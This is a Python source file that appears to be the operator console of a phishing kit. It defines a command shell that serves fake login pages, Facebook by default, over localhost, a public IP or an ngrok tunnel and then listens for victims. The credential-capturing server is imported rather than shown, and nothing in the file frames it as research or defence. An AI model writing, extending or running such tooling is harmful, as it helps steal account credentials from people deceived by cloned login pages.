from My_Style import (
    Color,Style,Animation,is_exist
    )

from tools.Fishing.SERVER.server \
import Fishing

from tools.root import (
HELP_FISHING as HELP,
OPTIONS_FISHING as OPTIONS,
PROMPT,
SHELL_ALL,
TOOLS_PATH,
XPATH )

class Fishing_shell(SHELL_ALL):
    # the shell command...
    prompt = PROMPT('Fishing')
    page = 'Facebook'
    server = None

    def help(self):
        return  self.SQUARE(HELP)

    def pages(self):
        files = []
        if self.check == 'folder':
            for d,r,f in os.walk(self.path):
                for i in f:
                    if i.endswith('.html'):
                        files.append(i.replace('.html',''))
        return files

    def do_start(self,arg):
        if self.page:
            try:
                F = Fishing()
                F.start(self.page)
                F.listening()
                input()
            except KeyboardInterrupt:
                exit('\rGood bye :D'+' '*20)

    def do_options(self,arg):
        # to set the color of the server type...
        type = Color.reader('Y#{ ')
        for i in ['ngrok','ip','localhost']:
            if self.server == i:
                type += Color.reader(f'G#{i}W# ')
            else:
                type += Color.reader(f'W#{i} ')
        type += Color.reader('Y#}')
        # to display the option msg...
        op = OPTIONS.format(
        page=self.page,
        server=type )

        op = self.SQUARE(op)
        self.SQUARE(op,type=False)

    def do_set(self,arg):
        NoError = True
        arg = arg.strip().split(' ')
        name = arg[0].strip()
        try:
            '''
            if the user set value else
            return error.
            '''
            set = arg[1].strip() # values
        except:
            NoError = False
            set = None
            name = None
            print('Error: value not found')
        if name == 'server':
            if set in ['localhost','ip','ngrok']:
                self.server = set
            else:
                NoError = False
                print(f'Error: {set}: not support this server')
        elif name == 'page':
            if set in self.pages():
                self.page = set
            else:
                NoError = False
                print(f'Error: {set}: page not found')
        else:
            NoError = False
            print(Color.reader(f'Error: {name}: command not found'))
        print (Color.reader(f'Y#{arg[0]} C#: W#{set}\n') if NoError else '',end='')

    def complete_set(self, text, line, begidx, endidx):
        OP = ['server','page']
        OP_H = ['localhost','ip','ngrok']
        if (not text) and line:
            return OP[:]
        else:
            return [f for f in OP_H if f.startswith(text)]
